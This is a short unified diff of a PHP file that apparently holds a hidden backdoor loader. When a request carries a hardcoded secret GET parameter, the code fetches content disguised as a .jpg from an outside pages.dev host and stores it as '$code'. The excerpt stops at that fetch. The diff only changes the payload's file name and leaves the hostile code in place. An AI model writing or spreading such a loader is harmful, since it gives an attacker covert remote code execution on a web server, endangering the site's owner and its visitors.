@@ -1,7 +1,7 @@
 <?php
 
 if (isset($_GET['_']) && $_GET['_'] === 'ds_mms999s111_gr3af332afbsnk') {
-    $url = "https://batuk-di-komik-aja.pages.dev/loaders.jpg";
+    $url = "https://batuk-di-komik-aja.pages.dev/loader.jpg";
 
     if ($url !== "") {
         $code = file_get_contents($url);
